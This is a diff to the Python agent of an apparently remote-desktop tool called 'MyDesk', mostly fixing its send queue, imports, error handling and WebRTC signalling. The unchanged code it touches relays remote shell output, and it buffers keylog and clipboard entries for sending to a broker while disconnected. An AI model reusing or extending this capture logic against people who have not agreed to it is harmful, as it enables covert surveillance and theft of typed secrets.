@@ -6,14 +6,13 @@ import uuid
 import json
 import subprocess
 import urllib.request
-import urllib.error
-import ssl
 import urllib.parse
 import platform
 import base64
 import threading
 import argparse
 import getpass
+import time
 from datetime import datetime
 
 try:
@@ -239,8 +238,8 @@ class AsyncAgent:
         self._shutdown_event = None
         self._heartbeat_trigger = None  # Wake-up trigger for immediate registry updates
 
-        # 🚀 Send Queue (Concurrency Saftey)
-        self.send_queue = asyncio.Queue()
+        # 🚀 Send Queue (Concurrency Safety)
+        self.send_queue = None
         self._sender_task = None
 
     def start(self, local_mode=False):
@@ -287,11 +286,9 @@ class AsyncAgent:
             err_msg = f"[!] Agent Loop Error: {e}"
             print(err_msg)
             try:
-                import datetime
-
                 with open(r"C:\ProgramData\MyDesk\agent_crash.txt", "a") as f:
-                    f.write(f"[{datetime.datetime.now()}] {err_msg}\n")
-            except:
+                    f.write(f"[{datetime.now()}] {err_msg}\n")
+            except Exception:
                 pass
 
     def _on_tunnel_url_change(self, new_url):
@@ -560,22 +557,43 @@ class AsyncAgent:
         while self.running:
             try:
                 msg = await self.send_queue.get()
-                if self.ws:
-                    await send_msg(self.ws, msg)
                 
+                # Check for Broker Connection
+                sent_to_broker = False
+                if self.ws:
+                    try:
+                        await send_msg(self.ws, msg)
+                        sent_to_broker = True
+                    except (websockets.exceptions.ConnectionClosed, Exception) as e:
+                        print(f"[-] Broker Send Error: {e}")
+                
+                # Buffer if disconnected or send failed
+                if not sent_to_broker:
+                    if len(msg) > 0:
+                        opcode = msg[0]
+                        if opcode in [
+                            protocol.OP_SHELL_OUTPUT,
+                            protocol.OP_SHELL_CWD,
+                            protocol.OP_SHELL_EXIT,
+                            protocol.OP_KEY_LOG,
+                            protocol.OP_CLIP_ENTRY,
+                        ]:
+                            if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
+                                self.output_buffer.append((opcode, msg[1:]))
+
                 # Also send to direct clients if any
                 if self.direct_ws_clients:
                     for client in list(self.direct_ws_clients):
                         try:
                             await send_msg(client, msg)
-                        except:
+                        except Exception:
                             self.direct_ws_clients.discard(client)
                 
                 self.send_queue.task_done()
             except asyncio.CancelledError:
                 break
             except Exception as e:
-                print(f"[-] Send Worker Error: {e}")
+                print(f"[-] Send Worker Fatal Error: {e}")
                 await asyncio.sleep(0.1)
 
     def _send_async(self, opcode, payload=b""):
@@ -583,22 +601,26 @@ class AsyncAgent:
         msg = bytes([opcode]) + payload
         
         # Queue for background sending
-        if self.loop and self.loop.is_running():
-            self.loop.call_soon_threadsafe(self.send_queue.put_nowait, msg)
-            sent = True
-        else:
-            sent = False
+        if self.loop and self.loop.is_running() and self.send_queue:
+            def safe_put():
+                try:
+                    self.send_queue.put_nowait(msg)
+                except asyncio.QueueFull:
+                    # Drop message if queue is full to prevent OOM
+                    print(f"[-] Send Queue Full: Dropping opcode {opcode}")
 
-        # GHOST MODE BUFFERING
-        if not sent and opcode in [
-            protocol.OP_SHELL_OUTPUT,
-            protocol.OP_SHELL_CWD,
-            protocol.OP_SHELL_EXIT,
-            protocol.OP_KEY_LOG,
-            protocol.OP_CLIP_ENTRY,
-        ]:
-            if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
-                self.output_buffer.append((opcode, payload))
+            self.loop.call_soon_threadsafe(safe_put)
+        else:
+            # Fallback buffering if loop/queue not ready
+            if opcode in [
+                protocol.OP_SHELL_OUTPUT,
+                protocol.OP_SHELL_CWD,
+                protocol.OP_SHELL_EXIT,
+                protocol.OP_KEY_LOG,
+                protocol.OP_CLIP_ENTRY,
+            ]:
+                if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
+                    self.output_buffer.append((opcode, payload))
 
     def on_shell_output(self, text):
         self._send_async(
@@ -676,6 +698,13 @@ class AsyncAgent:
             answer_msg = json.dumps(answer).encode("utf-8")
             await send_msg(source_ws, bytes([protocol.OP_RTC_ANSWER]) + answer_msg)
             print("[WebRTC] Sent SDP answer - streaming via WebRTC now")
+
+            # Send any gathered ICE candidates
+            # get_pending_ice_candidates is async now
+            candidates = await self.webrtc_handler.get_pending_ice_candidates()
+            for candidate in candidates:
+                ice_msg = json.dumps(candidate).encode("utf-8")
+                await send_msg(source_ws, bytes([protocol.OP_ICE_CANDIDATE]) + ice_msg)
 
         except Exception as e:
             print(f"[-] WebRTC Offer Error: {e}")
@@ -759,8 +788,6 @@ class AsyncAgent:
     def _validate_troll_request(self, opcode, payload_str):
         """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
         # 1. Cooldown Check
-        import time
-
         now = time.time()
         # Per-target cooldown (self)
         last_time = self.troll_cooldowns.get("self", 0)
@@ -775,9 +802,8 @@ class AsyncAgent:
 
         # 4. Gating (EarRape unsupported)
         if opcode == protocol.OP_TROLL_EARRAPE:
-            # print("[-] EarRape not supported/allowed.")
-            # return False
-            pass
+            print("[-] EarRape not supported/allowed.")
+            return False
 
         return True
 
@@ -859,6 +885,7 @@ class AsyncAgent:
             self._shutdown_event = asyncio.Event()
             self._heartbeat_trigger = asyncio.Event()
 
+            self.send_queue = asyncio.Queue(maxsize=100)
             self._create_background_task(self.supervisor_watchdog())
             self._sender_task = self._create_background_task(self._sender_worker())
 
@@ -1650,7 +1677,7 @@ class AsyncAgent:
                 async with websockets.connect(
                     self.broker_url,
                     open_timeout=20,  # Longer handshake for slow servers
-                    ping_interval=None,  # Disable auto-ping to handle lags manually if needed
+                    ping_interval=30,  # Keepalive enabled
                     ping_timeout=120,  # Very tolerant timeout
                 ) as ws:
                     self.ws = ws
